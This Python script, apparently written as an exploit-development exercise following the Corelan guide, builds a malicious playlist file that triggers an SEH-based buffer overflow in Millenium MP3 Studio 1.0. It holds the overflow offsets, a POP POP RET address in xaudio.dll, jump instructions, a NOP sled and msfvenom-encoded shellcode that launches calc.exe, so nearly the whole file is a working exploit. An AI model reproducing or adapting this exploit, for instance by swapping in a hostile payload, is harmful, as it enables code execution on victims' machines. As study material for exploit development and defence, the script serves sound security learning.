#!/usr/bin/python

# Author: Michael Music
# Date: 6/22/2019
# Description: Millenium MP3 Studio 1.0 Buffer Overflow - SEH Based
#  Exercise in BOFs following the corelan guide
#  Tested on Windows Server XP
# Notes: Required several jumps to bypass null byte substitution
#  Also required analysis for badchars, found \x1a

# nSEH at offset 4105
# SEH at offset 4109
# POP POP RET at 0x1001f668 in module xaudio.dll

out = 'crash.mpf'
junk = 'http://' # There was no need to remove the forward slashes

# With this exploit, there are 16 bytes immediately after SEH that I control
# After this 16 bytes, there are 4 bytes of nulls '\x00'
# After these nulls, there is nearly an endless buffer that I control

junk += 'A' * 4105
nseh = '\xeb\x06\x90\x90'
seh = '\x68\xf6\x01\x10'
#junk_2 = 'D' * (5000 - 4105 - 4 - 4)

# Test to see how the null overwriting works
#null_test = 'D' * 24
#junk_2 = 'E' * (5000 - 4105 - 4 - 4 - 24)

# So, the goal is to have SEH perform POP POP RET, nSEH JMP 6 bytes into the first 16 bytes I control
# Then, those first 12 bytes I control are NOPS, last 4 are a JMP 6 insruction to jump over the nulls
# Then, place a few NOPS, then my shellcode
# So: [A * 4105][JMP 6][POP POP RET address][NOP * 12][JMP 6][D * 4 (These are converted to nulls)][NOP * 16 (NOP Sled)][Shellcode]

jmp_nops = '\x90' * 12
jmp_over_nulls = '\xeb\x06\x90\x90'
nulls = 'D' * 4
nop_sled = '\x90' * 16

# msfvenom -p windows/exec CMD=calc.exe -f python -e x86/alpha_upper -b '\x00\x1a'
# Had to account for badchar 1a
buf =  ""
buf += "\x89\xe0\xdd\xc0\xd9\x70\xf4\x5f\x57\x59\x49\x49\x49"
buf += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += "\x4a\x49\x4b\x4c\x4a\x48\x4d\x52\x53\x30\x33\x30\x43"
buf += "\x30\x33\x50\x4b\x39\x4d\x35\x50\x31\x59\x50\x55\x34"
buf += "\x4c\x4b\x50\x50\x30\x30\x4c\x4b\x50\x52\x54\x4c\x4c"
buf += "\x4b\x50\x52\x45\x44\x4c\x4b\x53\x42\x31\x38\x44\x4f"
buf += "\x58\x37\x51\x5a\x36\x46\x30\x31\x4b\x4f\x4e\x4c\x37"
buf += "\x4c\x53\x51\x53\x4c\x33\x32\x46\x4c\x31\x30\x59\x51"
buf += "\x38\x4f\x54\x4d\x45\x51\x4f\x37\x5a\x42\x5a\x52\x46"
buf += "\x32\x31\x47\x4c\x4b\x56\x32\x32\x30\x4c\x4b\x30\x4a"
buf += "\x47\x4c\x4c\x4b\x30\x4c\x44\x51\x52\x58\x4b\x53\x51"
buf += "\x58\x43\x31\x48\x51\x36\x31\x4c\x4b\x51\x49\x51\x30"
buf += "\x33\x31\x4e\x33\x4c\x4b\x37\x39\x54\x58\x4a\x43\x57"
buf += "\x4a\x31\x59\x4c\x4b\x37\x44\x4c\x4b\x55\x51\x58\x56"
buf += "\x30\x31\x4b\x4f\x4e\x4c\x39\x51\x58\x4f\x34\x4d\x33"
buf += "\x31\x48\x47\x57\x48\x4d\x30\x52\x55\x4b\x46\x45\x53"
buf += "\x43\x4d\x4c\x38\x57\x4b\x43\x4d\x31\x34\x52\x55\x4d"
buf += "\x34\x51\x48\x4c\x4b\x36\x38\x56\x44\x53\x31\x48\x53"
buf += "\x42\x46\x4c\x4b\x44\x4c\x30\x4b\x4c\x4b\x31\x48\x35"
buf += "\x4c\x33\x31\x39\x43\x4c\x4b\x45\x54\x4c\x4b\x53\x31"
buf += "\x4e\x30\x4d\x59\x31\x54\x36\x44\x36\x44\x31\x4b\x31"
buf += "\x4b\x35\x31\x36\x39\x30\x5a\x30\x51\x4b\x4f\x4b\x50"
buf += "\x31\x4f\x31\x4f\x50\x5a\x4c\x4b\x32\x32\x4a\x4b\x4c"
buf += "\x4d\x31\x4d\x32\x4a\x33\x31\x4c\x4d\x4d\x55\x38\x32"
buf += "\x33\x30\x33\x30\x33\x30\x56\x30\x52\x48\x46\x51\x4c"
buf += "\x4b\x32\x4f\x4c\x47\x4b\x4f\x58\x55\x4f\x4b\x4c\x30"
buf += "\x4f\x45\x4e\x42\x56\x36\x55\x38\x39\x36\x4a\x35\x4f"
buf += "\x4d\x4d\x4d\x4b\x4f\x38\x55\x57\x4c\x53\x36\x33\x4c"
buf += "\x55\x5a\x4b\x30\x4b\x4b\x4b\x50\x43\x45\x45\x55\x4f"
buf += "\x4b\x31\x57\x32\x33\x34\x32\x42\x4f\x32\x4a\x33\x30"
buf += "\x50\x53\x4b\x4f\x48\x55\x43\x53\x35\x31\x32\x4c\x32"
buf += "\x43\x46\x4e\x55\x35\x34\x38\x52\x45\x55\x50\x41\x41"

exploit_string = junk + nseh + seh + jmp_nops + jmp_over_nulls + nulls + nop_sled + buf

junk_2 = 'D' * (5000 - len(exploit_string))

exploit_string += junk_2

text = open(out, 'w')
text.write(exploit_string)
text.close
